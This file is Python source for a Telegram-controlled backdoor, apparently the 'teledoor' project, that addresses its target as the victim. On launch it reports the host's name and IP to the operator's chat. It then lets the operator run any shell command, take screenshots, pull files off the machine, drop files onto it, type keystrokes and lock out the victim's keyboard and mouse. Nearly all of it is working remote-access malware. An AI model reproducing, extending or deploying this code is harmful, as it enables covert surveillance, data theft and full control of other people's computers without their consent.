from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
from telegram import Update
import telegram.ext
import subprocess
import pyautogui
import datetime
import platform
import json
import logging
import os
import socket
import pynput
import time


# Set up logging
file_name = "app.log"
logging.basicConfig(filename=file_name, level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s')
logging.info('-'*500)

# inilazation
Token = ""
ChatId = ""

try:
    with open("config.json", 'r') as config_file:
        config = json.load(config_file)

        Token = config.get("token")
        ChatId = config.get("chat_id")
        debug = config.get("debug")
        logging.debug("All information have been imported from json file")

except Exception as e:
    logging.warning(e)


def cd(update, context):
    try:
        to_change_dir = update.message.text[len('/cd '):]
        os.chdir(to_change_dir)
        update.message.reply_text(f"Command executed successfully:")
        logging.debug(f"dir has been changed to {os.getcwd()}")
    except Exception as E:
        update.message.reply_text(E)
        logging.error(E)


def ls(update, context):
    try:
        list_dir = update.message.text[len("/ls "):]
        os.listdir(list_dir)
        update.message.reply_text(f"Command executed successfully:")
        logging.debug("dir has been listed")
    except Exception as E:
        update.message.reply_text(E)
        logging.error(E)


def system_info(context):
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()

        SysInfo_str = (
            f"System Information:\n\n"
            f"Hostname: {hostname}\n"
            f"IP Address: {ip}\n"
            f"Processor: {plat}\n"
            f"System: {system}\n"
            f"Machine: {machine}")

        context.bot.send_message(
            chat_id=ChatId, text=SysInfo_str)
    except Exception as e:
        logging.error(e)


def yo(update, context):
    update.message.reply_text("I am still Alive!")
    logging.debug("yo to user")


def take_screenshot():
    # Naming file as time
    current_time = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    # Take a screenshot and save it
    screenshot = pyautogui.screenshot()
    screenshot.save(f"{current_time}.png")
    return f"{current_time}.png"

    logging.debug(f"screenshot has been sent namely: {current_time}")


def start(update, context):
    update.message.reply_text(
        "Hello! Welcoming you to Hack505 offical's . It's Mark I")
    logging.debug("A user has Started the bot")


def help(update, context):
    update.message.reply_text(""""How can I help you!
                              
    /start    --> just a start
    /yo       --> Greet's you
    /screen   --> Get you the screeshot
    /content  --> chat_idIt all about the content
    /jarvis   --> Extecute any command you want!
    /download --> Get any file form viticm
    /press    --> Press's special keys
    /arrow    --> use the arrows key now!
    /cd       --> let's change the dir
    /ls       --> It list the file name
    /blocker  --> Block the keyboard and mouse 
    $mouse    --> Get the mouse cooradanates
    $type     --> Type anything you want!
                              """)
    logging.debug("i have helped a user")


def content(update, context):
    update.message.reply_text(
        "The project is created by hack505 www.github.com/hack505, The author is not responsible for any problem due to this program ")
    logging.debug("a user now our content")


def screenshot(update, context):
    try:
        image_path = take_screenshot()
        update.message.reply_photo(photo=open(image_path, 'rb'))
    except Exception as e:
        update.message.reply_text(f"Error: {e}")
        logging.error(e)


def admin(update, context):
    update.message.reply_text(
        "this bot is a part of teledoor project made by hack505 offical ")
    logging.debug("i am the admin")


def handle_text(update, context):
    try:
        user_text = update.message.text

        if user_text == "$mouse":
            update.message.reply_text(str(pyautogui.position()))
            logging.debug(f"mouse corridates: {pyautogui.position()}")

        # Check if the message starts with the /type command
        elif user_text.startswith('$type'):
            # Extract the text after the /type command
            text_to_type = user_text[len('$type'):].strip()
            if text_to_type:
                pyautogui.write(text_to_type)
                logging.debug(f"typed: {text_to_type}")
            else:
                update.message.reply_text(
                    "Please provide text after the /type command.")
                logging.debug("can type or not text is provied")

    except Exception as e:
        update.message.reply_text(f"Error: {e}")
        logging.error(e)


def run_command(update, context):
    # Get the command from the user's message
    command = update.message.text[len('/jarvis '):]

    try:
        # Execute the command using subprocess
        result = subprocess.check_output(command, shell=True, text=True)
        update.message.reply_text(f"Command executed successfully:\n{result}")
        logging.debug(f"command: {command}")
    except subprocess.CalledProcessError as e:
        update.message.reply_text(f"Error executing command:\n{e}")
        logging.error(f"Error executing command:\n{e}")


def blocker(update, context):
    # Get the required blocking time for user's message
    timing = float(update.message.text.split('/blocker ')[1])
    # print(f"blocking keyboard and mouse of {timing} minutes")

    try:
        # Disable mouse and keyboard events
        mouse_listener = pynput.mouse.Listener(suppress=True)
        mouse_listener.start()
        keyboard_listener = pynput.keyboard.Listener(suppress=True)
        keyboard_listener.start()

        # sleep time for user to block
        time.sleep(timing * 60)

        # Enable mouse and keyboard events
        mouse_listener.stop()
        keyboard_listener.stop()
        update.message.reply_text(f"sucessful blocked for {timing} mintues")
    except Exception as e:
        update.message.reply_text(f"Error while blocking: \n{e}")


def download_file(update, context):
    try:
        # Get the file ID from the message
        file_id = update.message.document.file_id

        file_name = update.message.document.file_name

        # Get information about the file
        file_info = context.bot.get_file(file_id)
        file_name = context.bot.get_file(file_name)

        # Download the file
        file_path = file_info.download(file_name=file_name)

        update.message.reply_text(
            f"File downloaded successfully. Path: {file_path} file name: {file_name}")
        logging.debug(
            f"File downloaded successfully. Path: {file_path} file name: {file_name}")

    except Exception as e:
        logging.error(e)


def press_key(update, context):
    try:
        # Extract the keyour_context_variabley combination after the /presskey command
        key_combination = update.message.text[len('/press '):]
        if key_combination:
            key_combination = key_combination.split()
            pyautogui.hotkey(*key_combination)
            logging.debug(f"key to press: {key_combination}")
        else:
            update.message.reply_text(
                "Please provide a key combination after the /press command.")
    except Exception as e:
        update.message.reply_text(f"Error: {e}")
        logging.error(e)


def arrow_key(update, context):
    try:
        # Extract the arrow key command
        arrow_command = update.message.text[len('/arrow '):]

        # Map arrow commands to corresponding keys
        arrow_keys = {
            'up': 'up',
            'down': 'down',
            'left': 'left',
            'right': 'right',
        }

        # Check if the arrow command is valid
        if arrow_command in arrow_keys:
            pyautogui.hotkey(arrow_keys[arrow_command])
        else:
            update.message.reply_text("Invalid arrow key command.")
            logging.debug("Invalid arrow key command.")
    except Exception as e:
        update.message.reply_text(f"Error: {e}")
        logging.error(e)


def download_requested_file(update: Update, context: CallbackContext) -> None:
    upload_folder = os.getcwd()
    try:
        # Extract the file name from the command
        file_name = update.message.text[len('/download '):].strip()

        # Check if the requested file exists
        file_path = os.path.join(upload_folder, file_name)
        if os.path.exists(file_path):
            # Send the requested file to the user who sent the command
            update.message.reply_document(document=open(file_path, 'rb'))
            logging.debug(
                f"file as been sent namely: {file_name}, in path: {file_path}")
        else:
            update.message.reply_text(f"File '{file_name}' not found.")
            logging.debug(f"File '{file_name}' not found.")
    except Exception as e:
        update.message.reply_text(f"Error: {e}")
        logging.error(f"Error: {e}")


def edit_message(update, context):
    try:
        new_message_text = "This message has been edited."
        chat_id = update.message.chat_id

        # Send a new message
        sent_message = context.bot.send_message(
            chat_id=chat_id, text=new_message_text)

        # Edit the new message
        context.bot.edit_message_text(
            chat_id=chat_id, message_id=sent_message.message_id, text="Okay")

        update.message.reply_text("Message edited successfully!")

    except Exception as e:
        update.message.reply_text(f"Error: {e}")

# Main handlers


updater = telegram.ext.Updater(Token, use_context=True)

disp = updater.dispatcher

disp.add_handler(telegram.ext.CommandHandler('start', start))
disp.add_handler(telegram.ext.CommandHandler("help", help))
disp.add_handler(telegram.ext.CommandHandler("content", content))
# Add the new command handler
disp.add_handler(telegram.ext.CommandHandler("screen", screenshot))
disp.add_handler(telegram.ext.CommandHandler('jarvis', run_command))
disp.add_handler(telegram.ext.MessageHandler(
    telegram.ext.Filters.document, download_file))
disp.add_handler(telegram.ext.CommandHandler('yo', yo))
# disp.add_handler(telegram.ext.CommandHandler('yo', yo))
disp.add_handler(telegram.ext.CommandHandler('press', press_key))
disp.add_handler(telegram.ext.MessageHandler(
    telegram.ext.Filters.regex("arrow"), arrow_key))
# disp.add_handler(telegram.ext.CommandHandler("sys", system_info_on_request))
disp.add_handler(CommandHandler("download", download_requested_file))
disp.add_handler(CommandHandler("cd", cd))
disp.add_handler(CommandHandler("ls", ls))
disp.add_handler(CommandHandler("blocker", blocker))

disp.add_handler(telegram.ext.MessageHandler(
    telegram.ext.Filters.text, handle_text))  # biggest problem was due to this line  which was initially placed inline 319 therefore the handers after this were not working

updater.job_queue.run_once(system_info, 0)

updater.start_polling()
updater.idle()
